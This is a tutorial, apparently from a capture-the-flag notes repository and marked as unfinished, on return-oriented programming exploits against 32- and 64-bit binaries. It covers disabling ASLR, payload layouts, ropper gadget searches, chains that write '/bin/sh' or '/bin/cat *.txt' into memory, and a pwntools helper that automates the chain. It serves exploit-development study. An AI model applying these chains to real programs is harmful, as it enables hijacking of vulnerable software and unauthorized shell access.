ROP B1n-3xp

***To Disable Address Space Layout Randomization***

```
echo "0" >  /proc/sys/kernel/randomize_va_space
```

- [x] Not Yet Completed#  Under Construction!!!! 
# **The Stack Difference Between 32 and 64 bit binary**

##  x86_32

```
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+----------+---------+------+------+
|  %eax   | %ebx | %ecx | %edx | %esi | %edi | %ebp |
+---------+------+------+------+------+------+------+
```


*The way to exploit a 32bit binary is like reading a letter from a friend that's sent through post :
• First you will see a from address i.e the address from where the letter started it's journey (system_address)
• Second you will see a to address i.e the address to where the letter ends its journey (return address)
• Finally you will be able to see the contents of the letter i.e which is the context of the letter (arguments for the system_address)*

**Thus, the 32bit version payload would be…**

~~~
PAYLOAD = offset_padding + system_addr + "4_byte_junk" + print_flag
~~~


## x86_64
```
+---------+-------+-------+------+------+------+------+
| syscall |  arg0 |  arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+-------+-------+------+------+------+------+
|   %rax  | %rdi  |  %rsi | %rdx | %r10 |  %r8 | %r9  |
+---------+-------+-------+------+------+------+------+
```



*The way to exploit a 64bit binary is like reading a letter which is empty on the outside:
• First ,you have to open the letter without damaging it to know what is inside (rop gadgets)
• Second, you will be able to see the contents of the letter i.e the context of the letter (arguments for the system_address)
• Finally after reading the letter you will be able to know who wrote the letter i.e the from address (system_address)*

**The 64bit version payload would be…**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PAYLOAD =  offset_padding + pop_rdi_gadget + print_flag + system_address
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## **Writing in the Stack and executing  ROP (Return Oriented Programming) to pwn a binary**

◇ Find a place to write by checking for Writeable and Allocatable (WA) memory with enough space! 
~~~bash
readelf -S binary #[mem_address]
~~~
◇ Search for the appropriate mov gadget to inject the string into the stack by 
~~~bash
ropper --file binary --search "mov" #[mov_address]
~~~
◇ Search for the appropriate pop gadget to inject the string into the stack by 
~~~bash
ropper --file binary --search "pop" #[pop_address]
~~~

- ***Writing into the Stack in a 32bit binary***
	`For example if we are going to write the string “/bin/sh” into the stack. Given that we can only write 4 words at a time into the stack or else we may overwrite the other registers in the process.`
 
	- Writing “/bin” in the stack 
		- pop_address to clear the registers and then move to the mem_address and then write/overwrite it with “/bin” and then move back to EIP using mov_address , so that we can write the next part of string inside the memory
	~~~
	rop1 = pop_address + mem_address + “/bin” + mov_address
	~~~

	- Writing “//sh” or “/sh/x00”
		- pop_address to clear the registers and then move to the (mem_address+4)[The plus 4 is because the first 4 elements of the memory is already filled by rop1 ] and then write/overwrite it with “/sh” and then move back to EIP using mov_address , so that we can do a sys_call and call “/bin/sh”

	~~~
	rop2 = pop_address + (mem_address+4) + “/sh\x00” + mov_address
	~~~


- **Writing the Final Payload after writing “/bin/sh” into the stack**

~~~
PAYLOAD = offset_padding + rop1 + rop2 + system_address + *4_byte_junk* + mem_address
~~~
We can also use print function and flag_name.txt as argument to cat the flag... rather than getting a shell. If a print function is given in the binary

- ***Writing into the Stack in a 64bit binary***

	`I didnt wanna take the same example here as “/bin/sh” because it takes only 8bytes so we can complete the rop in a single line given that in 64bit we can write 8 words at a time into the stack as a threshold so to make it more interesting , i am writing the string “/bin/cat *.txt” into the stack.`
 
	- Writing “/bin/cat” in the stack 
		- pop_address to clear the registers and then move to the mem_address and then write/overwrite it with “/bin” and then move back to RIP using mov_address , so that we can write the next part of string inside the memory

	~~~
	rop1 = pop_address + mem_address + “/bin/cat” + mov_address
	~~~
	- Writing “ \*.txt” [Adding a space in the front as only “/bin/cat \*.txt” works and “/bin/cat \*.txt" doesnt]
		- pop_address to clear the registers and then move to the (mem_address+8)[The plus 8 is because the first 8 elements of the memory is already filled by rop1 ] and then write/overwrite it with “ \*.txt\x00\x00” and then move back to RIP using mov_address , so that we can do a sys_call and call “/bin/cat \*.txt”

	~~~
	rop2 = pop_address + (mem_address+8) + “ *.txt\x00\x00” + mov_address
	~~~

- Writing the Final Payload after writing “/bin/cat \*.txt” into the stack
`As it is a 64bit binary we need a pop_rdi gadget to pop RDI and create a fake stack to control the flow of execution, which can be selected from here `
~~~bash
ropper --file binary --search "pop rdi" #[pop_rdi]
~~~
~~~
PAYLOAD = offset_padding + rop1 + rop2 + pop_rdi + mem_address + sys_address
~~~


But I am too lazy to make a ROP chain and then append it with the PAYLOAD.....,So i automated the process to create the ropchain,not the finest program,But it WORKS!!! XD >_<

~~~python
from pwn import * #[pip2 install pwntools] because, I personally feel python2 is great for pwning binary

def ropper(mem_addr,pop_addr,mov_addr,sys_addr,string,arch = 32):
# Functionable for both 32 and 64 bit
#IMPORTANT : CHOOSE THE correct address for the rop chain to work
# Format of pop_addr,mov_addr and sys_addr - only packed as 32bit
# Format of mem_addr - as int or hex_int
# Format of string - only str
# Format of Arch - only int
	i = 0
	rop = ""
	if arch == 64:
		s = [string[j:j+8] for j in range(0,len(string),8)]
		for a in s:
			if len(a) % 8 != 0:
				a += "\x00"*(8 - len(a))
			rop += pop_addr + p64(mem_addr+i) + a + mov_addr
			i += 8
	else:
		s = [string[j:j+4] for j in range(0,len(string),4)]
		for a in s:
			if len(a) % 4 != 0:
				a += "\x00"*(4 - len(a))
			rop += pop_addr + p32(mem_addr+i) + a + mov_addr
			i += 4
	return rop

~~~
